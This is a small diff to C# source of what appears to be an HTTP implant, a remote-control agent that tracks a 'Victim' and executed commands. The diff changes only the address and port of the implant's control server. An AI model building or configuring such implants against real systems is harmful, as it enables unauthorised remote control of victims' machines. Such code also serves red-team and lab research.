@@ -41,8 +41,8 @@ namespace HTTPImplant
     {
 
         public static Victim victim = new Victim();
-        public static string host = "192.168.10.33";  // Host of the implant server
-        public static string port = "8081"; // Port of the implant server
+        public static string host = "192.168.56.101";  // Host of the implant server
+        public static string port = "8443"; // Port of the implant server
         public static string lastCommandExecuted = string.Empty; // Store the last command that was executed
         public static bool SMB = false;
         public static bool actsmb;
